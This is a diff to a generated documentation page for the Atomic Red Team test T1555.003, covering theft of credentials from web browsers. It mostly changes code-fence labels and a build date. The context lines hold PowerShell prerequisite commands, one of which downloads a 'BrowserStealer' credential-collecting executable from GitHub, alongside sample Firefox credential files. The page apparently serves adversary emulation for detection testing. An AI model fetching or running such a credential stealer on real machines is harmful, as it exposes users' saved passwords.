@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1555.003"
 attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "powershell"
 aliases:
   - "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd"
@@ -44,13 +44,13 @@ Firefox must be on the device.
 
 ### Prerequisite Check
 
-```text
+```powershell
 if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe") -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 $installer = "PathToAtomicsFolder\..\ExternalPayloads\FirefoxStubInstaller.exe"
 Invoke-WebRequest -OutFile $installer "https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US"
@@ -62,13 +62,13 @@ BrowserCollector must exist in the bin directory
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe"
 ```
@@ -77,13 +77,13 @@ Login Data file that is a copy of a Firefox Login Data that contains credentials
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "PathToAtomicsFolder\T1555.003\src\key4.db") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\key4.db"
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\logins.json"
 ```
